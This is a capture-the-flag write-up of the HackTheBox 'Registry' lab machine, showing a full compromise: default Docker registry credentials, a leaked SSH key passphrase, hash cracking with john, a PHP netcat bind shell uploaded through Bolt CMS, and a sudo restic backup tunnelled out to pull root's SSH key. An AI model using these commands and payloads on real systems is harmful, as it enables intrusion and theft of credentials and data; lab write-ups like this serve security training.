---
title: Hackthebox Registry Writeup
date: 2020-04-04 20:00:00 +0530
categories: [Hackthebox, Machine]
tags: [Hackthebox, Linux, Restic, Docker, Port Forwarding]
image:
  path: /assets/img/post/hackthebox/registry/main.png
---

# Information:~$

| Title         | Details       |
| -------- |:--------:|
| Name         |Registry |
| IP     | 10.10.10.159      |
| Difficulty| Hard      |
| Points | 40 |
| OS | Linux|


# Brief:~$

Registry was a hard rated Linux machine that was a bit of a journey but a lot of fun for me. The initial foothold was gained by taking advantage of a weak password on a Docker registry which enabled us to download sensitive files, one of which was a private ssh key for the user 'bolt' and its passphrase. While enumerating the system, a database file for the Bolt CMS was found which contained a hash for a weak password. Cracking the hash enabled admin access to the CMS, which let us upload a webshell and pivot to the 'www-data' user. 'Www-data' had sudo access to run a Restic backup, so a Restic REST server was deployed on my attacking machine and a ssh tunnel used to make it appear the rest server was local to Registry. From there, a backup of Registry's /root folder was run and restored to my attacking machine which included root's private ssh key.

# Reconnaissance:~$

We will start with basic `nmap` scan

## Nmap:~$

```bash
nmap -sC -sV 10.10.10.159
```

We get a bunch of Interesting Information

```bash
# Nmap 7.80 scan initiated Tue Feb 4 19:18:31 2020 as: nmap -sC -sV -oA nmap/initial 10.10.10.159
Nmap scan report for 10.10.10.159
Host is up (0.28s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open ssl/http nginx 1.14.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019–05–06T21:14:35
|_Not valid after: 2029–05–03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We get 3 ports open 22(SSH), 80(HTTP), 443(HTTPS)

One More Interesting Thing we found was `docker.registry.htb`

So Let’s edit our `Host` file first

```bash
 ~ >> cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       p3n

10.10.10.159    docker.registry.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Now, that we have our host setup, let’s browse and see what the website holds for us…


Let’s Start with `PORT 80`

![Registry](/assets/img/post/hackthebox/registry/1.png)

We get a welcome message nothing more Let’s do Fuzzing For that I am gonna use `FFUF`. Let’s keep it in background and explore `PORT 443` or we can say `docker.registry.htb`

We get a blank page. I was stuck here for a lot but after some searching and scratching my mind for some time and google search related to docker I got this [`Article!`](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)

After going through the article and adding v2 in the link I was asked to login Trying some common credentials like `admin:admin` & I was in and Downloaded a file named `latest`

{% raw %}
```
{
 “schemaVersion”: 1,
 “name”: “bolt-image”,
 “tag”: “latest”,
 “architecture”: “amd64”,
 “fsLayers”: [
 {
 “blobSum”: “sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b”
 },
 {
 “blobSum”: “sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee”
 },
 {
 “blobSum”: “sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c”
 },
 {
 “blobSum”: “sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7”
 },
 {
 “blobSum”: “sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791”
 },
 {
 “blobSum”: “sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4”
 },
 {
 “blobSum”: “sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0”
 },
 {
 “blobSum”: “sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a”
 },
 {
 “blobSum”: “sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797”
 },
 {
 “blobSum”: “sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff”
 }
 ],
 “history”: [
.
.
.
.
 “signature”: “6HpxKPnL87hRaIBu5RQgCRXsWBbC6outcySJY8bFb8Zu2mK_vzOhs8pP0KVepO7POZ6KyiFrPJXYJzVGba-Xrw”,
 “protected”: “eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMC0wMi0wNVQxMTo1OTowNloifQ”
 }
 ]
}
```
{% endraw %}

# Initial Foothold:~$

Now it’s time to download these blobs

Here’s the script I used

```python
#!/usr/bin/env python3
#This is registry docker script to download all images.import osblob1 = ‘302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b’
blob2 = ‘3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee’
blob3 = ‘02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c’
blob4 = ‘c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7’
blob5 = ‘2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791’
blob6 = ‘a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4’
blob7 = ‘f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0’
blob8 = ‘d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a’
blob9 = ‘8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797’
blob10 = ‘f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff’
url = ‘http://docker.registry.htb/v2/bolt-image/blobs/sha256:'blob_list = [blob1,blob2,blob3,blob4,blob5,blob6,blob7,blob8,blob9,blob10]for x in blob_list:
 #Debugging
 #print(“wget -O “ + x + ‘ ‘ + url + x)
 os.system(“wget — http-user=admin — http-password=admin -O “ + x + ‘.tar.gz ‘ + url + x)
```
After Downloading All the blobs we get a file structure of Linux

On doing some enumeration I founded an interesting file `02-ssh.sh` in `etc/profile.d`

```bash
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Hurray!! We got a `potential` password and `id_rsa` key

## SSH:~$

```bash
ssh -i id_rsa bolt@10.10.10.159
```

![Registry](/assets/img/post/hackthebox/registry/2.png)

# Enumeration:~$

After doing some enumeration and I founded an interesting file `/var/www/html` name `backup.php`

![Registry](/assets/img/post/hackthebox/registry/3.png)

Let’s note it down and enumerate more

After some enumeration we get a `database` file in `/var/www/html/bolt/app/database`

Download it in your system

![Registry](/assets/img/post/hackthebox/registry/4.png)

```bash
sqlite3 bolt.db
select * from bolt_users;
```

We get `user` and `password hash`

> admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK

Let’s pass it to our friend `john` see what he has to say

```bash
sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
It seems he has a solution for my problem

![Registry](/assets/img/post/hackthebox/registry/5.png)

# Privilege Escalation:~$

## bolt → www-data:~$

Get back to `Port 80`

![Registry](/assets/img/post/hackthebox/registry/6.png)

![Registry](/assets/img/post/hackthebox/registry/7.png)

![Registry](/assets/img/post/hackthebox/registry/8.png)

We get a site `10.10.10.159/bolt/bolt/login`

We have a password from john, log in to http://10.10.10.159/bolt/bolt and logged in successful!!

After doing some enumeration I knew I can `upload` files on the `server` by editing this `config` file

![Registry](/assets/img/post/hackthebox/registry/9.png)

![Registry](/assets/img/post/hackthebox/registry/10.png)

Add PHP here to allow php files to upload. After adding, upload php reverse shell but the reverse shell doesn’t get connected maybe reverse shell isn’t allowed. What else can we do perhaps bind shell

A great article explaining Bind Shell and reverse shell [`Here`](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

The article is easy to understand

Bind Shell command

```bash
<?php system ( "nc.traditional -lvp 44441 -e /bin/bash" ) ?>
```

`Upload` this file and click the link below. Keep in mind the `CMS` has `data backup` so the file should be uploaded as soon as possible after the modification

![Registry](/assets/img/post/hackthebox/registry/11.png)

Port 44441 of the local connection server

```bash
nc 10.10.10.159 44441
```
![Registry](/assets/img/post/hackthebox/registry/12.png)



## www-data → Root:~$

`sudo -l` view the executable `root` permission commands

```bash
sudo -l 
Matching Defaults entries for www-data on bolt: env_reset, exempt_group = sudo, mail_badpass, secure_path = /usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User www-data may run the following commands on bolt:
 ( root ) NOPASSWD: /usr/bin/restic backup -r rest*
```
Google restic to learn Read the [Documentation](https://restic.readthedocs.io/en/latest/)

Focus on two things

![Registry](/assets/img/post/hackthebox/registry/13.png)

For creating a backup we are gonna initialize a server on our local machine

let’s install `restic`

```bash
sudo apt install restic
```
After installation Let’s create a repo

```bash
restic init --repo /tmp/restic
```

Let’s add a password

```
enter password for new repository:
enter password again:

created restic repository 3a81f8b8bc at /tmp/restic 
Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irrecoverably lost.
```

Download restic server from [Github](https://github.com/restic/rest-server/releases)

![Registry](/assets/img/post/hackthebox/registry/14.png)

Unzip and then run the `executable` file

It will start a `server`

Because the target server seems to have a firewall, it cannot actively connect to the external server. So to back up data to the local machine, we will do port forwarding.

```bash
ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159
```

`Backup` with the `www-data` user’s authority.

Create a `password` file named `pass` containing the password of `restic server` and then this

```bash
sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 --password-file pass
```
![Registry](/assets/img/post/hackthebox/registry/15.png)

View backup information locally

```bash
restic -r /tmp/restic/ restore latest --target ./
```

Check the newly created root directory and you will find ssh keys for root

```bash
ssh -i id_rsa root@10.10.10.159
```
![Registry](/assets/img/post/hackthebox/registry/16.png)


# Resources:~$

| Topic | Link|
|-------|-----|
|Docker| [Here](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)|
|Bind Shell Tutorial|[Here](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)|
|Restic Docs|[Here](https://restic.readthedocs.io/en/latest/)|
|Restic Server|[Here](https://github.com/restic/rest-server/releases)

With this, we come to the end of the story of how I owned Registry 😃

Thank you for reading !!!

*I would love to hear about any suggestions or queries.*